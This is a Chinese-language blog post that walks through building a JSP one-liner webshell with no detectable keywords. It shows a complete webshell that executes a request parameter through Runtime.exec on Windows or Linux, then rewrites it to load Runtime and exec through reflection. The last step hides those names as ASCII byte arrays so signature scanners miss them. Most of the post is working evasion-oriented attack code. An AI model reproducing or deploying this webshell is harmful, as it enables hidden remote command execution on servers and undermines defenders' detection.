---
title: jsp无关键字一句话
date: 2022-05-16 20:23:20
tags:
      - 一句话
categrious: java
---
## jsp无关键字一句话
通过ascii码与字符之间的转换,加上通过反射加载类,实现无关键字一句话

#### py脚本`script_str2ascii`

首先写一个简单的py脚本,转换命令为byte数组

```python
cmd=input("input code")
arr=[]
for char in cmd:
    arr.append(ord(char))
print(arr)
```

#### 开始

接下来找一个简单的小马,进行改造

```jsp
<%
    String cmd = request.getParameter("cmd");
    StringBuffer res = new StringBuffer();
    //加一个系统的判断
    String os = System.getProperty("os.name");
    boolean isWin = false;
    BufferedReader bufferedReader;
    if (os != null && os.toLowerCase().startsWith("windows")) {
        isWin = true;
    }
    try {
        if (isWin == false) {
            bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
        } else {
            bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("cmd /C " + cmd).getInputStream()));
        }

        String len;
        while ((len = bufferedReader.readLine()) != null) {
            res.append(len + "\n");
        }

    } catch (Exception e) {
        res.append(e.getMessage());

    }
   out.print("<pre>" + res.toString() + "</pre>");
%>

```

#### 通过反射改变获取类并执行的方式

主要目的是将runtime相关的类和函数通过反射进行修改

```jsp
<%Class<?> aClass = Class.forName("java.lang.Runtime");//这个forName加载类的时候会执行类内的静态代码块
    Method method = aClass.getMethod("getRuntime");
    Object o = method.invoke(null);//这里获取到runtime类
    Method method1 = aClass.getMethod("exec", String.class);
    method1.invoke(o,"calc");
%>
```

通过反射加载runtime类的方式可行,并且成功弹出了计算器

接下来通过ascii数组,替换其中比较敏感的字符串

上面那个小马里面别的不关键的东西懒得写了.....

**这里可以使用byte数组,原因是当前涉及到的字符串中的所有字符ascii码均在127以下**

#### 加入byte数组

通过byte数组修饰以下关键字

```java
<%
    byte[] a={106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101};
    Class<?> aClass = Class.forName(new String(a));//这个forName加载类的时候会执行类内的静态代码块
    byte[] b={103, 101, 116, 82, 117, 110, 116, 105, 109, 101};
    Method method = aClass.getMethod(new String(b));
    Object o = method.invoke(null);//这里获取到runtime类
    byte[] c={101, 120, 101, 99};
    Method method1 = aClass.getMethod(new String(c), String.class);
    method1.invoke(o,request.getParameter("haha"));
%>
```


